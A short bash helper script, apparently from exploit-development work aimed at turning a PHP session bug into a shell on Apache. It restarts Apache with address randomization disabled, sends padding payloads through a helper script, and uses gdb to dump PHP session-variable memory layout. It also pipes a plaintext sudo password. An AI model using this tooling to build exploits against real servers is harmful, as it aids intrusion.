#!/bin/bash
# usage: probe_ref.sh "pad specs"
PADS="$@"
cd /home/debian/php2shell-work
echo debian.qwe123 | sudo -S bash -c "apache2ctl -k stop 2>/dev/null; sleep 0.6; pkill -9 apache2; sleep 0.6; ulimit -c unlimited; setarch \$(uname -m) -R /usr/sbin/apache2ctl -k start; sleep 0.8" >/dev/null 2>&1
echo debian.qwe123 | sudo -S rm -f /tmp/sess_attacksessionid0001 >/dev/null 2>&1
python3 ./send_a_pad.py 17 19 3 12 $PADS >/dev/null 2>&1
sleep 0.3
W=$(pgrep -x apache2 | tail -1)
echo "worker=$W pads=[$PADS]"
echo debian.qwe123 | sudo -S gdb -p $W -batch \
 -ex "set pagination off" \
 -ex "printf \"PSVARS ti=%x ptr=%p\n\", ps_globals.http_session_vars.u1.type_info, ps_globals.http_session_vars.value.ptr" \
 -ex "set \$r=ps_globals.http_session_vars.value.ptr" \
 -ex "printf \"REF gc=%lx valptr=%p valti=%lx src=%p\n\", *(unsigned long*)\$r, *((void**)\$r+1), *((unsigned long*)\$r+2), *((void**)\$r+3)" \
 -ex detach 2>/dev/null | grep -E "PSVARS|REF "
